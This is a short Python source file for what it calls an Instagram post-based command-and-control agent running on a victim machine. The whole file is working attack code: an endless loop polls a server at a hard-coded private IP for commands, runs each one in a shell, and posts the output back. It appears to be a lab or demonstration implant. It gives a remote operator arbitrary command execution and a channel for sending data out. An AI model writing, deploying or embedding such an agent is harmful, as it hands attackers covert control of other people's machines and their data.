#!/usr/bin/env python3
"""
Instagram Post-based C2 Agent (Victim Machine)
Fetches commands from C2 server, executes them, sends results back
"""
import subprocess
import requests
import time
import sys

class PostC2Agent:
    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.session = requests.Session()

    def fetch_command(self):
        """Fetch command from C2 HTTP endpoint"""
        try:
            response = self.session.get(f"{self.c2_server}/command", timeout=5)
            data = response.json()

            if data.get('command'):
                print(f"[+] Received command from Instagram: {data['command']}")
                return data['command']
            else:
                return None

        except requests.exceptions.ConnectionError:
            print(f"[-] Cannot connect to C2 server: {self.c2_server}")
            return None
        except Exception as e:
            print(f"[-] Failed to fetch command: {e}")
            return None

    def execute_command(self, command):
        """Execute command on local system"""
        try:
            print(f"[*] Executing: {command}")
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            output = result.stdout + result.stderr
            print(f"[+] Output:\n{output}")
            return output
        except Exception as e:
            print(f"[-] Execution failed: {e}")
            return None

    def send_result(self, result):
        """Send result back to C2 server"""
        try:
            response = self.session.post(
                f"{self.c2_server}/result",
                json={"result": result},
                timeout=5
            )
            if response.status_code == 200:
                print("[+] Result sent to C2 server (Athena)")
                return True
            else:
                print(f"[-] Failed to send result: {response.status_code}")
                return False

        except Exception as e:
            print(f"[-] Failed to connect to C2 server: {e}")
            return False

    def run(self):
        """Main agent loop"""
        print("[*] Starting Instagram Post-based C2 Agent")
        print(f"[*] Connecting to C2 server: {self.c2_server}")
        print("[*] Commands come from Instagram posts (posted by attacker)")
        print("[*] Results sent back to Athena\n")

        while True:
            print("[*] Checking for commands from Instagram...")

            command = self.fetch_command()
            if not command:
                print("[*] No commands. Waiting 15 seconds...")
                time.sleep(15)
                continue

            result = self.execute_command(command)
            if result:
                self.send_result(result)

            print("[*] Waiting for next command...")
            time.sleep(15)

if __name__ == "__main__":
    # C2 Server (on Athena)
    C2_SERVER = "http://192.168.72.139:5000"

    agent = PostC2Agent(C2_SERVER)
    agent.run()
